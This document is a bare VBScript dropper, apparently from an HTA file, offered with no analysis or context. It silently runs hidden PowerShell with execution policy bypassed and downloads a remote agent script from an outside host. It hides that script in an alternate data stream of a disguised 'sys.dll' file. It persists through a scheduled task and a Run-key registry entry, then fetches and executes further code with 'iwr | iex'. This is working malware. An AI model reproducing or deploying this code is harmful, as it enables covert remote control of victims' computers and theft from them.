Set objShell = CreateObject("WScript.Shell")
userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
' Define your PowerShell script as a string



psScript = "$vbsstring = "&"'uid = """"""" & uid & """""""'" & " + """ & "[char]10" & vbCrLf & _
			"$vbsstring += " & "(iwr 'https://ecs.rcsis.ir/static/js/agent.js').content" & vbCrLf & _
           "$hiddenFilePath = '"& userProfile &"\sys.dll'" & vbCrLf & _
		   "$vbsstring = [System.Text.Encoding]::UTF8.GetBytes($vbsstring)" & vbCrLf & _
           "echo $vbsstring | Set-Content -Path $hiddenFilePath -Stream 'system' -Encoding Byte;" & vbCrLf & _
           "Set-ItemProperty -Path $hiddenFilePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System);"
' Build the command to execute PowerShell script
command = "powershell.exe  -W Hidden -ExecutionPolicy Bypass -Command " + """" & psScript & """"
' Run the PowerShell command
objShell.Run command, 0, False

script = "'wscript.exe /E:VBScript "& userProfile &"\sys.dll:system'"

psScript = "schtasks /create /tn " & "System " &"/tr " & script &" /sc minute /mo 10 /f /it| out-null"
command = "powershell.exe  -W Hidden  -ExecutionPolicy Bypass -Command """ & psScript & """"
objShell.Run command, 0, False



psScript = "reg.exe add " & "'" & "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" & "'" &" /v SystemINIT /t REG_SZ /d "& "" & script & "" & " /f | out-null"
command = "powershell.exe  -noexit  -ExecutionPolicy Bypass -Command """ & psScript & """"
objShell.Run command, 0, False


Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell  -C iwr 'https://ecs.rcsis.ir?uid=" & uid & "&s=3' | iex", 0, False

' Clean up
Set objShell = Nothing
self.close
